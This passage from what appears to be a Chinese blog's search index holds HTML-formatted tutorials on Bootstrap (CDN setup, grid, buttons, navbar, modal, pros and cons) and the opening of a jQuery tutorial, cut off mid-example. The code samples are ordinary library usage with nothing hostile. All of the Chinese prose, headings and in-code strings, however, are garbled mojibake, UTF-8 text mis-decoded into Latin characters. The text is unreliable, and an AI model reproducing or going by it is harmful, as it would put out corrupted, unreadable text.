punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>é€šè¿‡ npm å®‰è£…</strong>ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> bootstrap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-2-åŸºæœ¬ç¤ºä¾‹"><a href="#3-2-åŸºæœ¬ç¤ºä¾‹" class="headerlink" title="3.2 åŸºæœ¬ç¤ºä¾‹"></a>3.2 <strong>åŸºæœ¬ç¤ºä¾‹</strong></h2><p><strong>åˆ›å»ºä¸€ä¸ªå“åº”å¼é¡µé¢å¸ƒå±€</strong>ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Bootstrap ç½‘æ ¼ç¤ºä¾‹<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>åˆ— 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>åˆ— 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>åˆ— 3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="å››ã€å¸¸è§çš„ç»„ä»¶ç¤ºä¾‹"><a href="#å››ã€å¸¸è§çš„ç»„ä»¶ç¤ºä¾‹" class="headerlink" title="å››ã€å¸¸è§çš„ç»„ä»¶ç¤ºä¾‹"></a>å››ã€å¸¸è§çš„ç»„ä»¶ç¤ºä¾‹</h1><h2 id="4-1-æŒ‰é’®"><a href="#4-1-æŒ‰é’®" class="headerlink" title="4.1 æŒ‰é’®"></a>4.1 æŒ‰é’®</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>ä¸»æŒ‰é’®<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-secondary<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>æ¬¡æŒ‰é’®<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4-2-å¯¼èˆªæ "><a href="#4-2-å¯¼èˆªæ " class="headerlink" title="4.2 å¯¼èˆªæ "></a>4.2 å¯¼èˆªæ </h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar navbar-expand-lg navbar-light bg-light<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container-fluid<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-brand<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Logo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-toggler<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-toggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>collapse<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#navbarNav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-toggler-icon<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>collapse navbar-collapse<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbarNav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-item<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-link active<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>ä¸»é¡µ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-item<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-link<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>åŠŸèƒ½<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-item<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-link<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>è”ç³»<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-3-æ¨¡æ€æ¡†"><a href="#4-3-æ¨¡æ€æ¡†" class="headerlink" title="4.3 æ¨¡æ€æ¡†"></a>4.3 æ¨¡æ€æ¡†</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- è§¦å‘æŒ‰é’® --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-toggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#exampleModal<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    æ‰“å¼€æ¨¡æ€æ¡†<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- æ¨¡æ€æ¡† --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal fade<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>exampleModal<span class="token punctuation">"</span></span> <span class="token attr-name">tabindex</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-dialog<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-content<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-header<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-title<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>æ¨¡æ€æ¡†æ ‡é¢˜<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn-close<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-dismiss</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-body<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                è¿™æ˜¯æ¨¡æ€æ¡†çš„å†…å®¹ã€‚            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-footer<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-secondary<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-dismiss</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>å…³é—­<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>ä¿å­˜æ›´æ”¹<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="äº”ã€ä¼˜ç‚¹ä¸ä¸è¶³"><a href="#äº”ã€ä¼˜ç‚¹ä¸ä¸è¶³" class="headerlink" title="äº”ã€ä¼˜ç‚¹ä¸ä¸è¶³"></a>äº”ã€ä¼˜ç‚¹ä¸ä¸è¶³</h1><h2 id="5-1-ä¼˜ç‚¹"><a href="#5-1-ä¼˜ç‚¹" class="headerlink" title="5.1 ä¼˜ç‚¹"></a>5.1 <strong>ä¼˜ç‚¹</strong></h2><ul><li>å¿«é€Ÿå¼€å‘ï¼šå‡å°‘ CSS å’Œ JavaScript çš„é‡å¤å·¥ä½œã€‚</li><li>é«˜è´¨é‡ï¼šæä¾›ä¸€è‡´çš„è§†è§‰å’ŒåŠŸèƒ½ä½“éªŒã€‚</li><li>å¤§é‡ç¤¾åŒºæ”¯æŒå’Œæ’ä»¶ã€‚</li></ul><h2 id="5-2-ä¸è¶³"><a href="#5-2-ä¸è¶³" class="headerlink" title="5.2 ä¸è¶³"></a>5.2 <strong>ä¸è¶³</strong></h2><ul><li>æ ·å¼å¯èƒ½æ˜¾å¾—è¿‡äºé€šç”¨ï¼Œç¼ºä¹ä¸ªæ€§åŒ–ã€‚</li><li>å¯¹å°å‹é¡¹ç›®å¯èƒ½æ˜¾å¾—ç¹é‡ã€‚</li></ul><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>Bootstrap æ˜¯å‰ç«¯å¼€å‘çš„å¼ºå¤§å·¥å…·ï¼Œç‰¹åˆ«é€‚ç”¨äºéœ€è¦å¿«é€Ÿå¼€å‘ã€å“åº”å¼è®¾è®¡å’Œä¸€è‡´æ€§ä½“éªŒçš„é¡¹ç›®ã€‚å°½ç®¡ç°ä»£å‰ç«¯æ¡†æ¶ï¼ˆå¦‚ React å’Œ Vueï¼‰æä¾›äº†æ›´å¤šäº¤äº’åŠŸèƒ½ï¼Œä½† Bootstrap åœ¨ä¼ ç»Ÿç½‘ç«™å¼€å‘ä¸­ä»å…·æœ‰é‡è¦åœ°ä½ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å‰åç«¯å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‰ç«¯å¼€å‘ </tag>
            
            <tag> Bootstrap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jQuery</title>
      <link href="/2024/12/09/qian-hou-duan-kai-fa/jquery/"/>
      <url>/2024/12/09/qian-hou-duan-kai-fa/jquery/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€jQueryç®€ä»‹"><a href="#ä¸€ã€jQueryç®€ä»‹" class="headerlink" title="ä¸€ã€jQueryç®€ä»‹"></a>ä¸€ã€jQueryç®€ä»‹</h1><p>jQuery æ˜¯ä¸€ä¸ªå¿«é€Ÿã€ç®€æ´ã€è·¨å¹³å°çš„ JavaScript åº“ï¼Œä¸“ä¸ºç®€åŒ– HTML æ–‡æ¡£æ“ä½œã€äº‹ä»¶å¤„ç†ã€åŠ¨ç”»åˆ¶ä½œä»¥åŠä¸æœåŠ¡å™¨ç«¯çš„äº¤äº’ï¼ˆAjaxï¼‰è€Œè®¾è®¡ã€‚å®ƒç”± John Resig äº 2006 å¹´åˆ›å»ºï¼Œç°å·²æˆä¸ºå‰ç«¯å¼€å‘ä¸­æœ€å¹¿æ³›ä½¿ç”¨çš„å·¥å…·ä¹‹ä¸€ã€‚</p><p>è™½ç„¶ jQuery æ›¾åœ¨å‰ç«¯å¼€å‘ä¸­å æ®ä¸»å¯¼åœ°ä½ï¼Œä½†éšç€ç°ä»£æ¡†æ¶ï¼ˆå¦‚ Reactã€Vueã€Angularï¼‰çš„å´›èµ·ï¼Œå®ƒçš„ä½¿ç”¨æœ‰æ‰€å‡å°‘ã€‚ç„¶è€Œï¼Œç”±äºå…¶ç®€å•æ€§å’Œå¹¿æ³›æ”¯æŒï¼ŒjQuery åœ¨è®¸å¤šé¡¹ç›®ä¸­ä»ç„¶æœ‰ä¸€å¸­ä¹‹åœ°ï¼Œå°¤å…¶æ˜¯åœ¨éœ€è¦å¿«é€Ÿå¼€å‘æˆ–ç»´æŠ¤æ—§é¡¹ç›®æ—¶ã€‚</p><h1 id="äºŒã€-jQuery-æ ¸å¿ƒç‰¹ç‚¹"><a href="#äºŒã€-jQuery-æ ¸å¿ƒç‰¹ç‚¹" class="headerlink" title="äºŒã€ jQuery æ ¸å¿ƒç‰¹ç‚¹"></a>äºŒã€ jQuery æ ¸å¿ƒç‰¹ç‚¹</h1><h3 id="1-è·¨æµè§ˆå™¨å…¼å®¹æ€§"><a href="#1-è·¨æµè§ˆå™¨å…¼å®¹æ€§" class="headerlink" title="1. è·¨æµè§ˆå™¨å…¼å®¹æ€§"></a>1. <strong>è·¨æµè§ˆå™¨å…¼å®¹æ€§</strong></h3><p>jQuery è§£å†³äº†ä¸åŒæµè§ˆå™¨å¯¹ JavaScript çš„å®ç°å·®å¼‚ï¼Œæä¾›ç»Ÿä¸€çš„æ¥å£ï¼Œä½¿å¼€å‘è€…èƒ½æ›´è½»æ¾åœ°ç¼–å†™è·¨æµè§ˆå™¨çš„ä»£ç ã€‚</p><h3 id="2-ç®€åŒ–-DOM-æ“ä½œ"><a href="#2-ç®€åŒ–-DOM-æ“ä½œ" class="headerlink" title="2. ç®€åŒ– DOM æ“ä½œ"></a>2. <strong>ç®€åŒ– DOM æ“ä½œ</strong></h3><p>é€šè¿‡ jQueryï¼Œå¼€å‘è€…å¯ä»¥ç”¨ç®€å•ã€ç›´è§‚çš„è¯­æ³•è½»æ¾åœ°é€‰æ‹©ã€æ“ä½œ HTML å…ƒç´ ã€‚ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// ä½¿ç”¨ jQuery ä¿®æ”¹å…ƒç´ å†…å®¹</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#myElement"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">"æ–°çš„å†…å®¹"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-äº‹ä»¶å¤„ç†"><a href="#3-äº‹ä»¶å¤„ç†" class="headerlink" title="3. äº‹ä»¶å¤„ç†"></a>3. <strong>äº‹ä»¶å¤„ç†</strong></h3><p>jQuery æä¾›äº†ç®€ä¾¿çš„äº‹ä»¶ç»‘å®šå’Œè§£ç»‘æ–¹æ³•ï¼Œä¾‹å¦‚ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// ä¸ºæŒ‰é’®ç»‘å®šç‚¹å‡»äº‹ä»¶</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#myButton"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"æŒ‰é’®è¢«ç‚¹å‡»ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-åŠ¨ç”»ä¸æ•ˆæœ"><a href="#4-åŠ¨ç”»ä¸æ•ˆæœ" class="headerlink" title="4. åŠ¨ç”»ä¸æ•ˆæœ"></a>4. <strong>åŠ¨ç”»ä¸æ•ˆæœ</strong></h3><p>jQuery å†…ç½®å¤šç§åŠ¨ç”»æ•ˆæœï¼Œå¯ä»¥å¿«é€Ÿå®ç°é¡µé¢åŠ¨æ€æ•ˆæœï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// æ·¡å…¥å…ƒç´ </span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#myElement"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fadeIn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="5-Ajax-æ”¯æŒ"><a href="#5-Ajax-æ”¯æŒ" class="headerlink" title="5. Ajax æ”¯æŒ"></a>5. <strong>Ajax æ”¯æŒ</strong></h3><p>jQuery æä¾›äº†æ–¹ä¾¿çš„ Ajax æ–¹æ³•ï¼Œå¯ä»¥è½»æ¾ä¸æœåŠ¡å™¨äº¤äº’ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// é€šè¿‡ jQuery å‘èµ· GET è¯·æ±‚</span>$<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"example.com/api"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token 